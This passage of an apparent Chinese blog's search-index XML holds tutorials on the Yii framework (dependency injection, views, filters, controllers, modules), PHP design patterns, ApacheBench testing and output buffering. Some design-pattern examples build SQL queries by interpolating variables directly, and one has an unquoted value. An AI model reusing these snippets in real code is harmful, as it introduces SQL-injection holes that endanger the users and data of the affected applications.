'app\models\UserLister');// 获取这个UserList的实例$lister = $container-&gt;get('userLister'); 采用DI容器的办法，首先各 set() 语句没有前后关系的要求， set() 只是写入特定的数据结构， 并未涉及具体依赖关系的解析。所以，前后关系不重要，先定义什么依赖，后定义什么依赖没有关系。 其次，上面根本没有在DI容器中定义 UserFinder 对于 Connection 的依赖。 但是DI容器通过对 UserFinder 构造函数的分析，能了解到这个类会对 Connection 依赖。这个过程是自动的。 在Yii.php中会创建一个DI 容器，并由 Yii::$container 引用 Yii::$container = new yii\di\Container;，创建了一个DI容器，并由 Yii::$container 引用。 也就是说， Yii 类维护了一个DI容器，这是DI容器开始介入整个应用的标志。 同时，这也意味着，在Yii应用中，我们可以随时使用 Yii::$container 来访问DI容器。 一般情况下，如无必须的理由，不要自己创建DI容器，使用 Yii::$container 完全足够。 服务定位器 服务定位器使用了 DI容器 来解决依赖关系，服务定位器是一个了解如何提供各种应用所需的服务（或组件）的对象。 在服务定位器中，每个组件都只有一个单独的实例，并通过ID 唯一地标识。 用这个 ID 就能从服务定位器中得到这个组件。 服务定位器就像 注册树模式 一样。 123456789101112131415161718192021222324252627&lt;?phpnamespace app\controllers;use yii\web\Controller;//使用容器use yii\di\Container;use yii\di\ServiceLocator;/*** 依赖注入*/class DependencyController extends Controller&#123; public function actionIndex() &#123; //需要使用容器类 $container =new Container; //set，当发现是接口无法实例化时，指定接口的要实例化的类 //实例化这个类作为参数 $container-&gt;set('app\controllers\Dirver','app\controllers\ManDirver'); //服务定位器 $sl = new ServiceLocator; $sl-&gt;set('car', ['class'=&gt;'app\controllers\Car']) $car=$sl-&gt;get('car'); $car-&gt;run(); &#125;&#125; \YII::$app 就是一个服务定位器，如果将服务定位器中的 set 配置在配置文件中的 component中就可以直接使用 \YII::$app-&gt;car-&gt;run()]]></content>
      <categories>
        <category>yii</category>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>Behavior</tag>
        <tag>依赖注入</tag>
        <tag>DI容器</tag>
        <tag>服务定位器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-view]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-view%2F</url>
    <content type="text"><![CDATA[视图中访问数据 通过控制器的 render() 方法传递给视图层 在视图层通过 $this-&gt;context 来获取所对应的控制器对象，可以访问对象中的属性值 在 控制器 controller 中 使用 $this-&gt;view-&gt;params[&#39;menu&#39;] ;在布局中可以使用 $this-&gt;params[&#39;menu&#39;] 访问; 控制器中 $this-&gt;view 获取到的就是 视图层中的 $this视图和布局文件中共享 $this 只要是 $this 添加属性，两个里面都可以访问到 视图键共享数据布局文件和视图之间的数据共享 布局文件和视图都可以通过 $this-&gt;context 来获取所对应的控制器对象，来使用属性值 view component视图组件提供 params 参数 属性来让不同视图共享数据。 例如：12345678index.php 视图文件&lt;?php$this-&gt;params['ding']='ran' ?&gt;layout 布局文件&lt;?phpecho $this-&gt;params['ding']; ?&gt; 布局 不使用布局文件 $this-&gt;layout = false,通过 $this-&gt;layout 来指定布局文件；也可以直接声明 layout 属性进行设置整个控制器的。 123456789101112131415161718192021222324&lt;?phpuse yii\helpers\Html;/* @var $this yii\web\View *//* @var $content string 字符串 */?&gt;&lt;?php $this-&gt;beginPage() ?&gt;&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"/&gt; &lt;?= Html::csrfMetaTags() ?&gt; &lt;title&gt;&lt;?= Html::encode($this-&gt;title) ?&gt;&lt;/title&gt; &lt;?php $this-&gt;head() ?&gt;&lt;/head&gt;&lt;body&gt;&lt;?php $this-&gt;beginBody() ?&gt; &lt;header&gt;My Company&lt;/header&gt; &lt;?= $content ?&gt; &lt;footer&gt;&amp;copy; 2014 by My Company&lt;/footer&gt;&lt;?php $this-&gt;endBody() ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $this-&gt;endPage() ?&gt; 如上所示，布局生成每个页面通用的HTML标签，在标签中，打印 $content 变量， $content变量代表当 yii\base\Controller::render() 控制器渲染方法调用时传递到布局的内容视图渲染结果。 大多数视图应调用上述代码中的如下方法， 这些方法触发关于渲染过程的事件， 这样其他地方注册的脚本和标签会添加到这些方法调用的地方。 它触发表明页面开始的 EVENT_BEGIN_PAGE 事件。 它触发表明页面结尾的 EVENT_END_PAGE 时间。 它生成一个占位符，在页面渲染结束时会被注册的头部HTML代码 （如，link标签, meta标签）替换。 它触发 EVENT_BEGIN_BODY 事件并生成一个占位符， 会被注册的HTML代码（如JavaScript）在页面主体开始处替换。 它触发 EVENT_END_BODY 事件并生成一个占位符， 会被注册的HTML代码（如JavaScript）在页面主体结尾处替换。 嵌套布局 一个布局嵌套在另一个布局内，可以实现多层嵌套布局 123456789101112content.php 子布局文件//嵌套方法//@app/views/layouts/main.php 表示要嵌套在main.php布局内，填充父布局的 $content 变量 &lt;?php $this-&gt;beginContent('@app/views/layouts/main.php'); ?&gt;&lt;hr&gt;&lt;?=$content ;?&gt;&lt;hr&gt;&lt;?php $this-&gt;endContent(); ?&gt;//main.php yii默认布局，不用动 控制器修改布局为子布局 $this-&gt;loayout = 'content'; 使用数据块 视图文件中定义数据块，布局文件根据逻辑判断使用数据块，用来做网页布局部分不相同的视图部分 123456789101112//视图文件定义数据块 &lt;?php $this-&gt;beginBlock('block1'); ?&gt;...content of block1...&lt;?php $this-&gt;endBlock(); ?&gt;//布局文件使用数据块 &lt;?php if (isset($this-&gt;blocks['block1'])): ?&gt; &lt;?= $this-&gt;blocks['block1'] ?&gt;&lt;?php else: ?&gt; ... default content for block1 ...&lt;?php endif; ?&gt; 设置标题123&lt;?php$this-&gt;title = 'My page title';?&gt; 然后在视图中，确保在 &lt;head&gt; 段中有如下代码：1&lt;title&gt;&lt;?= Html::encode($this-&gt;title) ?&gt;&lt;/title&gt; 注册Meta元标签Web页面通常需要生成各种元标签提供给不同的浏览器，如 &lt;head&gt; 中的页面标题， 元标签通常在布局中生成。如果想在内容视图中生成元标签，可在内容视图中调用 yii\web\View::registerMetaTag() 方法， 如下所示：123&lt;?php$this-&gt;registerMetaTag(['name' =&gt; 'keywords', 'content' =&gt; 'yii, framework, php']);?&gt; 以上代码会在视图组件中注册一个 &quot;keywords&quot; 元标签， 在布局渲染后会渲染该注册的元标签， 然后，如下HTML代码会插入到布局中调用 yii\web\View::head() 方法处：1&lt;meta name="keywords" content="yii, framework, php"&gt; 注册链接标签和 Meta标签 类似，链接标签有时很实用， 如自定义网站图标，指定Rss订阅，或授权OpenID到其他服务器。 可以和元标签相似的方式调用 yii\web\View::registerLinkTag()，例如，在内容视图中注册链接标签如下所示：123456$this-&gt;registerLinkTag([ 'title' =&gt; 'Live News for Yii', 'rel' =&gt; 'alternate', 'type' =&gt; 'application/rss+xml', 'href' =&gt; 'http://www.yiiframework.com/rss.xml/',]); 上述代码会转换成1&lt;link title="Live News for Yii" rel="alternate" type="application/rss+xml" href="http://www.yiiframework.com/rss.xml/"&gt; 视图事件View components 视图组件会在视图渲染过程中触发几个事件， 可以在内容发送给终端用户前，响应这些事件来添加内容到视图中或调整渲染结果。该事件可设置 yii\base\ViewEvent::$isValid 为 false 取消视图渲染。 EVENT_AFTER_RENDER: 在布局中调用 yii\base\View::beginPage() 时触发， 该事件可获取 yii\base\ViewEvent::$output 的渲染结果， 可修改该属性来修改渲染结果。 EVENT_BEGIN_PAGE: 在布局调用 yii\base\View::beginPage() 时触发； EVENT_END_PAGE: 在布局调用 yii\base\View::endPage() 是触发； EVENT_BEGIN_BODY: 在布局调用 yii\web\View::beginBody() 时触发； EVENT_END_BODY: 在布局调用 yii\web\View::endBody() 时触发。 例如，如下代码将当前日期添加到页面结尾处：123\Yii::$app-&gt;view-&gt;on(View::EVENT_END_BODY, function () &#123; echo date('Y-m-d');&#125;);]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii-view</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-过滤器]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-filter%2F</url>
    <content type="text"><![CDATA[过滤器 Filters 过滤器是 控制器 动作 执行之前或之后执行的对象。 例如访问控制过滤器可在动作执行之前来控制特殊终端用户是否有权限执行动作， 内容压缩过滤器可在动作执行之后发给终端用户之前压缩响应内容。 过滤器可包含 预过滤（过滤逻辑在动作之前） 或 后过滤（过滤逻辑在动作之后）， 也可同时包含两者。 通过配置 only属性 来给定使用过滤器的 动作action ，配置 except属性 来给定那些 动作action 不使用过滤器 使用过滤器过滤器本质上是一类特殊的 行为(behaviors)，所以使用过滤器和 使用 行为一样。 可以在控制器类中覆盖它的 yii\base\Controller::behaviors() 方法来申明过滤器， 如下所示：12345678910111213public function behaviors()&#123; return [ [ 'class' =&gt; 'yii\filters\HttpCache', 'only' =&gt; ['index', 'view'], 'lastModified' =&gt; function ($action, $params) &#123; $q = new \yii\db\Query(); return $q-&gt;from('user')-&gt;max('updated_at'); &#125;, ], ];&#125; 控制器类的过滤器默认应用到该类的 所有 动作， 你可以配置 only属性 明确指定控制器应用到哪些动作。 在上述例子中， HttpCache 过滤器只应用到index和view动作。 也可以配置 except属性 使一些动作不执行过滤器。 除了控制器外，可在 模块或应用主体 中申明过滤器。 申明之后，过滤器会应用到所属该模块或应用主体的 所有 控制器动作， 除非像上述一样配置过滤器的 only 和 except 属性。 注意: 在模块或应用主体中申明过滤器，在 only 和 except 属性中使用路由 代替动作ID， 因为在模块或应用主体中只用动作ID并不能唯一指定到具体动作。 当一个动作有多个过滤器时，根据以下规则先后执行：预过滤 按顺序执行应用主体中 behaviors() 列出的过滤器。 按顺序执行模块中 behaviors() 列出的过滤器。 按顺序执行控制器中 behaviors() 列出的过滤器。 如果任意过滤器终止动作执行， 后面的过滤器（包括预过滤和后过滤）不再执行。 成功通过预过滤后执行动作。 后过滤 倒序执行控制器中 behaviors() 列出的过滤器。 倒序执行模块中 behaviors() 列出的过滤器。 倒序执行应用主体中 behaviors() 列出的过滤器。 创建过滤器继承 yii\base\ActionFilter 类并覆盖 beforeAction() 和/或 afterAction() 方法来创建动作的过滤器，前者在动作执行之前执行，后者在动作执行之后执行。 beforeAction() 返回值决定动作是否应该执行， 如果为false，之后的过滤器和动作不会继续执行。 下面的例子申明一个记录动作执行时间日志的过滤器。12345678910111213141516171819202122namespace app\components;use Yii;use yii\base\ActionFilter;class ActionTimeFilter extends ActionFilter&#123; private $_startTime; public function beforeAction($action) &#123; $this-&gt;_startTime = microtime(true); return parent::beforeAction($action); &#125; public function afterAction($action, $result) &#123; $time = microtime(true) - $this-&gt;_startTime; Yii::trace("Action '&#123;$action-&gt;uniqueId&#125;' spent $time second."); return parent::afterAction($action, $result); &#125;&#125;]]></content>
      <categories>
        <category>yii</category>
        <category>过滤器</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>过滤器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-controller]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-controller%2F</url>
    <content type="text"><![CDATA[控制器生命周期处理一个请求时， 应用主体 会根据请求路由创建一个控制器， 控制器经过以下生命周期来完成请求： 在控制器创建和配置后，yii\base\Controller::init() 方法会被调用。控制器根据请求动作ID创建一个操作对象:如果动作ID没有指定，会使用default action ID默认操作ID；如果在action map找到动作ID， 会创建一个独立动作；如果动作ID对应操作方法，会创建一个内联操作；否则会抛出yii\base\InvalidRouteException异常。控制器按顺序调用应用主体、模块（如果控制器属于模块）、 控制器的 beforeAction() 方法；如果任意一个调用返回false，后面未调用的beforeAction()会跳过并且动作执行会被取消； action execution will be cancelled.默认情况下每个 beforeAction() 方法会触发一个 beforeAction 事件，在事件中你可以追加事件处理动作；控制器执行动作:请求数据解析和填入到动作参数；控制器按顺序调用控制器、模块（如果控制器属于模块）、 应用主体的 afterAction() 方法；默认情况下每个 afterAction() 方法会触发一个 afterAction 事件，在事件中你可以追加事件处理动作；应用主体获取动作结果并赋值给响应. 设置默认动作public $defaultAction = ‘home’; 跳转return $this-&gt;redirect(‘http://example.com‘); 独立动作 渲染静态页面的时候使用它会方便一点 独立动作通过继承yii\base\Action或它的子类来定义。 例如Yii发布的yii\web\ViewAction和yii\web\ErrorAction 都是独立动作。 要使用独立动作，需要通过控制器中覆盖yii\base\Controller::actions()方法在action map中申明， 如下例所示： public function actions(){ return [ // 用类来申明”error” 动作 ‘error’ =&gt; ‘yii\web\ErrorAction’, // 用配置数组申明 &quot;view&quot; 动作 &apos;view&apos; =&gt; [ &apos;class&apos; =&gt; &apos;yii\web\ViewAction&apos;, &apos;viewPrefix&apos; =&gt; &apos;&apos;, ], ]; }如上所示， actions() 方法返回键为动作ID、值为对应操作类名或数组configurations 的数组。 和内联动作不同，独立动作ID可包含任意字符， 只要在actions() 方法中申明. 为创建一个独立动作类，需要继承yii\base\Action 或它的子类，并实现公有的名称为run()的方法, run() 方法的角色和动作方法类似，例如： &lt;?phpnamespace app\components; use yii\base\Action; class HelloWorldAction extends Action{ public function run() { return “Hello World”; }}动作结果动作方法或独立操作的run()方法的返回值非常重要， 它表示对应动作结果。 Action类中有两个属性 id 和 controller 可以分别获取所在控制器的 id 和 此控制器对象]]></content>
      <categories>
        <category>yii</category>
        <category>controller</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>controller</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-module模块化]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-module%E6%A8%A1%E5%9D%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[模块化技术 将项目分成若干个小项目，配合使用，每个模块都是一个mvc父模块下需要有相关 子模块的的开启和关闭功能的配置文件 可以使用gii快速生成模块;例如：12class: app\modules\article\Article module id: article 再生成它的子模块article模块下的category模块12class: app\modules\article\modules\category\Catejory module id: catejory 在生成信息的下面会出现配置信息，需要复制到配置信息，来开启模块功能(全局模块)12345'modules' =&gt; [ 'article' =&gt; [ 'class'=&gt;'app\modules\article\Article', ],], 可以通过 ?r=article/controller/action 来访问 article 下的控制器与方法 父模块中开启子模块(局部模块)父模块中的 Article.php 类中配置12345678910public function init()&#123; parent::init(); //配置子模块。 $this-&gt;modules = [ 'category' =&gt; [ 'class' =&gt; 'app\modules\article\modules\category\Category' ], ];&#125; 在父模块中进行配置可以通过一下方式进行访问 ?r=article/category/controller/action 进行访问 通过模块，运行模块中控制器的方法在父模块的控制器中可以获取子模块并操作子模块1234//获取子模块$article = \\YII::$app-&gt;getModule('article');//通过模块的id获取//调用子模块的操作$article-&gt;runAction('default/index');//操作default控制器下的index操作]]></content>
      <categories>
        <category>yii</category>
        <category>module</category>
      </categories>
      <tags>
        <tag>yii-module</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-debug与gii模块]]></title>
    <url>%2F2017%2F07%2F03%2Fyii%2FYii-debug%E4%B8%8Egii%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[开启两个模块123456789101112if (!YII_ENV_TEST) &#123; // configuration adjustments for 'dev' environment $config['bootstrap'][] = 'debug';//启动加载debug模块 $config['modules']['debug'] = [//定义debug模块 'class' =&gt; 'yii\debug\Module', ]; $config['bootstrap'][] = 'gii'; $config['modules']['gii'] = [ 'class' =&gt; 'yii\gii\Module', ];&#125; debug模块 debug 模块可以很好的帮助调试和优化，可以查看执行过程所走的sql语句及时间 测试代码段执行的时间–profile可以在debug页面请求中的profile选项查看运行情况1234\YII::beginProfile('profile1'); #注意 YII 全大写和 Yii等效，最好不用全大写echo "hello world";sleep(1);\YII::endProfile('profile1'); gii模块 自动生成代码]]></content>
      <categories>
        <category>yii</category>
        <category>gii</category>
        <category>debug</category>
      </categories>
      <tags>
        <tag>yii-debug</tag>
        <tag>gii</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-设计模式]]></title>
    <url>%2F2017%2F07%2F03%2Fphp%2Fphp-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[工厂模式 工厂模式封装了类的声明过程，实例化对象不使用new声明了，可以解决 改类名需要去找到所有new此对象一个一个改的问题，通过将new对象封装在一个方法里，如果类名进行改动，可以在方法里直接改，而不影响其他地方工厂模式是一种良好的代码规范，是编写代码遵守的很好的一种习惯。使用工厂模式，可以使代码更简洁易懂，层次清晰。同时工厂模式也可以提高代码的可维护性。 单例模式 单例模式：声明周期内，一个类只会实例化一次对象。主要用于防止多次创建数据库连接，造成资源浪费 注册器模式 创建一个注册器类，将创建的对象绑定到注册树上，之后可以在全局通过注册树类进行访问绑定过的类可以结合在工厂模式中结合使用，其实可以实现单利模式的目的，即创建一次，全局使用； 1234567891011121314151617181920212223/*** 注册树类*/class Register&#123; protected static $objects; //通过别名的方式，将对象绑定到注册树上 static function set($alias, $object) &#123; self::$objects[$alias] = $object; &#125; //通过别名获取对象 static function get($alias) &#123; return self::$objects[$alias]; &#125; //销毁 static function _unset($alias) &#123; unset(self::$objects[$alias]); &#125;&#125; 适配器模式 多个相同功能目的的类，通过相同的方法来实现相同的功能目的 适配器模式，可以将截然不同的函数接口封装成同一的API 实例应用举例，PHP的数据库操作有mysql、mysqli，pdo3种，可以用适配器模式统一成一致，类似的场景还有cache适配器，将memcache、redis、file等不同的缓存函数，同一成一致 实现： 定义一个定义了约定要实现的方法的接口 不同的类实现这个接口，来各自完成自己的实现相应方法的逻辑12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849//定义接口interface IDatabase&#123; function connect($host, $user, $passwd, $dbname); function query($sql); function close();&#125;//不同的数据库实现此接口 #mysqliclass MySQLi implements IDatabase&#123; protected $conn; function connect($host, $user, $passwd, $dbname) &#123; $conn = mysqli_connect($host, $user, $passwd, $dbname); $this-&gt;conn = $conn; &#125; function query($sql) &#123; return mysqli_query($this-&gt;conn, $sql); &#125; function close() &#123; mysqli_close($this-&gt;conn); &#125;&#125;#pdoclass PDO implements IDatabase&#123; protected $conn; function connect($host, $user, $passwd, $dbname) &#123; $conn = new \PDO("mysql:host=$host;dbname=$dbname", $user, $passwd); $this-&gt;conn = $conn; &#125; function query($sql) &#123; return $this-&gt;conn-&gt;query($sql); &#125; function close() &#123; unset($this-&gt;conn); &#125;&#125; 策略模式实现分支逻辑的处理 避免在 if else 中直接写实现的代码，将实现代码封装到不同的类(策略)中，有利于解耦，同时，也可以提高复用性 策略模式，将一组特定的行为和算法封装成类，以适应某些特定的上下文环境 实际应用举例，加入一个电商网站系统，针对男性女性用户要各自跳转到不同的商品类目，并且所有广告位展示不同的广告 实现和适配器模式相似： 定义一个定义了约定要实现的方法的接口 不同的策略类实现这个接口，来各自完成自己的实现相应方法的逻辑 在 if else 中调用不同的策略 依赖倒置、控制反转在一个类中的方法需要用到某个类的对象，如果在类的方法中直接创建，就导致了紧耦合，可以到要执行方法时，再将需要的对象创建出来赋值给所需此类的对象或方法 数据对象映射模式 类似于yii的AR模式，通过操作对象的属性和方法来完成对数据的增删改查 数据对象映射模式，将对象和数据存储映射起来，对一个对象的操作会映射为对数据存储的操作 123456789101112131415161718192021222324252627282930313233343536373839404142class User&#123; protected $id; protected $data; protected $db; protected $change = false; function __construct($id) &#123; $this-&gt;db = Factory::getDatabase(); $res = $this-&gt;db-&gt;query("select * from user where id = $id limit 1"); $this-&gt;data = $res-&gt;fetch_assoc(); $this-&gt;id = $id; &#125; //魔术方法获取对象不存在的属性时调用 function __get($key) &#123; if (isset($this-&gt;data[$key])) &#123; return $this-&gt;data[$key]; &#125; &#125; //魔术方法设置对象不存在的属性时调用 function __set($key, $value) &#123; $this-&gt;data[$key] = $value; $this-&gt;change = true; &#125; //析构方法，对象销毁时调用 function __destruct() &#123; if ($this-&gt;change) &#123; foreach ($this-&gt;data as $k =&gt; $v) &#123; $fields[] = "$k = '&#123;$v&#125;'"; &#125; $this-&gt;db-&gt;query("update user set " . implode(', ', $fields) . "where id = &#123;$this-&gt;id&#125; limit 1"); &#125; &#125;&#125; 观察者模式 观察者模式(Observer)，当一个对象状态发生改变时，依赖他的对象全部会受到通知，并自动更新 场景：一个事件发生后，要执行一连串更新操作，传统的编程方式，就是在事件的代码之后直接加入处理逻辑当更新的逻辑增多之后，代码会变的难以维护。这种方式是耦合的，侵入式的，增加新的逻辑需要修改事件主体的代码 观察者模式实现了低耦合，非侵入式的通知与更新机制 实现：123456789101112131415161718192021222324252627282930313233343536373839404142434445//事件产生者 抽象类EventGenerator.phpabstract class EventGenerator&#123; private $obserers = array(); //为事件添加观察者 function addObsever(Observer $observer)&#123; $this-&gt;obserers[] = $observer; &#125; //通知观察者 调用观察者响应的方法 function ontify()&#123; foreach ($this-&gt;obserers as $observer)&#123; $observer-&gt;update(); &#125; &#125;&#125;//事件event.phpclass Event extends EventGenerator&#123; function trigger()&#123; echo "Event &lt;br&gt;"; $this-&gt;ontify(); &#125;&#125;//观察者接口，定义要实现的被触发的方法 Observer.phpinterface Observer&#123; function update($event_info = null);&#125;//观察者1Observer1.phpclass Observer1 implements Observer&#123; function update($event_info = null)&#123; echo "逻辑1"; &#125;&#125;…………//使用index.php$event = new Event();$event-&gt;addObsever(new Observer1());$event-&gt;addObsever(new Observer2());$event-&gt;addObsever(new Observer3());$event-&gt;trigger(); 原型模式 对与需要大量初始化的对象，多次创建比较耗费资源，即可将初始化后的对象当作原型，使用 clone 的方式创建多个不同的对象 原型模式与工厂模式作用类似,都是用来创建对象 与工厂模式的实现不同,原型模式是先创建好一个原型对象,然后通过clone原型对象来创建新的对象,这样就免去了类创建时重复的初始化操作 原型模式适用于大对象的创建,创建一个大对象需要很大的开销,如果每次new就会消耗很大,原型模式仅需内存拷贝即可 装饰器模式 扩展类的原有方法，不需要继承重写，在方法的开始和结尾增加预处理方法 装饰模式,可以动态的添加修改类的功能 一个类提供了一项功能,如果要在修改并添加额外的功能,传统的编程模式,需要写一个之类继承它,并重新实现类的方法 使用装饰模式,仅需在运行时添加一个装饰对象即可实现,可以实现最大的灵活性 实现： 定义一个装饰器接口，定义要实现的方法 创建一个对象实现装饰器的接口 在指定类中使用装饰器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364//定义装饰器接口 interface DrawDecorator&#123; function beforeDraw(); function afterDraw();&#125;//创建装饰器，实现装饰器接口 class ColorDrawDecorator implements DrawDecorator&#123; protected $color; function __construct($color = 'red') &#123; $this-&gt;color = $color; &#125; function beforeDraw() &#123; echo "&lt;div style='color: &#123;$this-&gt;color&#125;;'&gt;"; &#125; function afterDraw() &#123; echo "&lt;/div&gt;"; &#125;&#125;//使用装饰器class Canvas&#123; protected $decorators = array(); //添加装饰器 function addDecorator(DrawDecorator $decorator) &#123; $this-&gt;decorators[] = $decorator; &#125; //调用方法之前先调用装饰器的方法 function beforeDraw() &#123; foreach($this-&gt;decorators as $decorator) &#123; $decorator-&gt;beforeDraw(); &#125; &#125; //调用方法之后调用装饰器的方法 function afterDraw() &#123; $decorators = array_reverse($this-&gt;decorators); foreach($decorators as $decorator) &#123; $decorator-&gt;afterDraw(); &#125; &#125; //此方法使用装饰器的方法 function draw() &#123; $this-&gt;beforeDraw(); foreach($this-&gt;data as $line) &#123; foreach($line as $char) &#123; echo $char; &#125; echo "&lt;br /&gt;\n"; &#125; $this-&gt;afterDraw(); &#125;&#125; 迭代器模式 遍历对象，迭代器实现遍历的细节与输出数据 迭代器模式，在不需要了解内部实现的前提下，遍历一个聚合对象的内部元素。 相比传统的编程模式，迭代器模式可以隐藏遍历元素的所需操作。 实现：实现php自带的 Iterator 接口，分别实现接口5个方法spl迭代器执行顺序： rewind，将索引重置到数组第一个元素； valid，验证数据有效性； current，获取当前数据； next，将索引值向下移动； key，获取当前索引 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//遍历表中所有的数据//实现迭代器class AllUser implements \Iterator&#123; protected $ids; protected $data = array(); protected $index; //查询出所有用户的id function __construct() &#123; $db = Factory::getDatabase(); $result = $db-&gt;query("select id from user"); $this-&gt;ids = $result-&gt;fetch_all(MYSQLI_ASSOC); &#125; //3. 获取当前索引的值(id的记录) function current() &#123; $id = $this-&gt;ids[$this-&gt;index]['id']; return Factory::getUser($id); &#125; //4. 将索引值向下移动 function next() &#123; $this-&gt;index ++; &#125; //2. 验证当前索引是否合理 function valid() &#123; return $this-&gt;index &lt; count($this-&gt;ids); &#125; //1. 遍历开始，重置索引到第一个数组的元素 function rewind() &#123; $this-&gt;index = 0; &#125; //5. 获取当前索引 function key() &#123; return $this-&gt;index; &#125;&#125;//遍历 ,遍历到的就是 current() 返回的值$users = new AllUser;foreach ($users as $user) &#123; var_dump($user-&gt;user)&#125; AR模式遍历所有记录对象应该比这个高明，应该是开销比这个小，不用每遍历一个就请求一次mysql获取数据，有待查阅 代理模式 对于多个服务(myql主从之类的)只管正常的使用，代理类中帮助实现选用和实现具体的细节 在客户端与实体之间建立一个代理对象(proxy)，客户端对实体进行操作全部委派给代理对象，隐藏实体的具体细节 典型的应用：mysql读写分离1234567891011121314151617181920//代理类class Proxy&#123; //获取数据时，使用从库 function getUserName($id) &#123; $db = Factory::getDatabase('slave'); $db-&gt;query("select name from user where id =$id limit 1"); &#125; //修改数据时，使用主库 function setUserName($id, $name) &#123; $db = Factory::getDatabase('master'); $db-&gt;query("update user set name = $name where id =$id limit 1"); &#125;&#125;//通过代理对象，正常的实现读写功能，而不用手动的切换库了 $proxy = new Proxy;$proxy-&gt;getUserName($id);$proxy-&gt;setUserName($id, $name);]]></content>
      <categories>
        <category>php</category>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站优化-静态化]]></title>
    <url>%2F2017%2F07%2F03%2F%E7%BD%91%E7%AB%99%E4%BC%98%E5%8C%96-%E9%9D%99%E6%80%81%E5%8C%96%2F</url>
    <content type="text"><![CDATA[ab测试工具 -n 请求的总数量 -c 并发数 -t 请求的总时间 单位秒 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263//在并发数100的情况下，发出5000个请求，所消耗的时间 ding:github-blog echo-ding$ ab -n 5000 -c 100 http://www.yiifirst.com///在并发100的情况下，持续10秒，可以完成多少请求数//ding:github-blog echo-ding$ ab -t 10 -c 100 http://www.yiifirst.com/----------------输出-------------------//软件信息This is ApacheBench, Version 2.3 &lt;$Revision: 1796539 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org///测试进度Benchmarking www.yiifirst.com (be patient)Completed 500 requestsCompleted 1000 requestsCompleted 1500 requestsCompleted 2000 requestsCompleted 2500 requestsCompleted 3000 requestsCompleted 3500 requestsCompleted 4000 requestsCompleted 4500 requestsCompleted 5000 requestsFinished 5000 requests//服务器信息Server Software: Apache/2.4.26Server Hostname: www.yiifirst.comServer Port: 80//响应信息Document Path: /Document Length: 25938 bytes//测试结果Concurrency Level: 100 #并发级别Time taken for tests: 61.459 seconds #测试总用时Complete requests: 5000 #完成请求数量Failed requests: 0 #请求失败数Total transferred: 132882558 bytes #总的数据传输量HTML transferred: 129690000 bytes #总的数据量，响应主体Requests per second: 81.36 [#/sec] (mean) #请求数量／每秒Time per request: 1229.171 [ms] (mean) #每组请求消耗的时间Time per request: 12.292 [ms] (mean, across all concurrent requests) #平均每个请求消耗的时间Transfer rate: 2111.47 [Kbytes/sec] received #传输效率//结果的统计//最佳，最差，平均结果Connection Times (ms) min mean[+/-sd] median maxConnect: 0 2 7.7 0 120Processing: 77 1223 264.1 1219 2608Waiting: 47 1146 235.2 1166 1998Total: 78 1225 264.0 1221 2608//统计结果Percentage of the requests served within a certain time (ms) 50% 1221 66% 1310 75% 1372 80% 1413 90% 1539 95% 1658 98% 1793 //98%的请求可以在 1793ms内完成 99% 1909 100% 2608 (longest request) 静态化 页面静态化，就是将需要后段数据配合生成的页面缓存起来，下次访问将不再需要对后段的各种请求解析，直接访问存取的静态页面框架正常都带有方便的缓存设置功能方法，不需要手动写ob了 ob缓存简单操作123456789101112131415161718192021222324252627282930313233343536ob_start()开启输出缓冲 之后的任意的响应主体输出，都会存储到该缓冲区。 ob_get_content() 获取缓冲中内容 所有的响应主体都输出完毕后，需要获取到。 Ob_get_clean();// 获取后清空;之前的输出将不会在客户端输出Ob_get_flush();// 获取后刷新；之前的输出立刻输出到客户端ob_end_clean(); 关闭同时清空输出缓冲；将不会输入 file_put_contents($filename, $content); //将获取到的内容输出到文件开启 startOb_start()获取 getOb_get_contents();// 获取内容Ob_get_clean();// 获取后清空Ob_get_flush();// 获取后刷新刷新 flush将缓冲内容向下传输Ob_flush();// 直接刷新 在需要将内容立即在浏览器端显示时，通常使用！Ob_end_flush(); 刷新后关闭Ob_get_flush(); 获取后刷新即使没有刷新，脚本结束时，PHP核心会自动刷新。清空 clean清空缓存区内容Ob_clean(); 直接清空Ob_get_clean(); 获取后清空Ob_end_clean(); 清空关闭关闭 endOb_end_clean(); 清空后关闭Ob_end_flush(); 刷新后关闭。后续的输出就不会再出现在输出缓存中。 多obob缓冲区，允许开启多次每当执行一次OB_start()就会开启一次输出缓存。而对OB的操作，都是针对于当前的活跃缓存区。–最新开启的这个缓存区。 1Ob_get_level()获取当前缓存的深度。 PHP默认会开启一个输出缓冲。12php.inioutput_buffering = 4096 开启缓冲，并设置最大缓冲大小 4096byte 缓冲处理器开启缓冲时，可以制定一个函数，用于处理当缓冲内容被刷新时，处理缓存数据。 典型的处理器：ob_gzhandler();根据浏览器所能够接受的压缩类型，对缓冲数据进行压缩。 使用缓存压缩 –开启的时候加入处理器名字即可1ob_start( 'ob_gzhandler'); 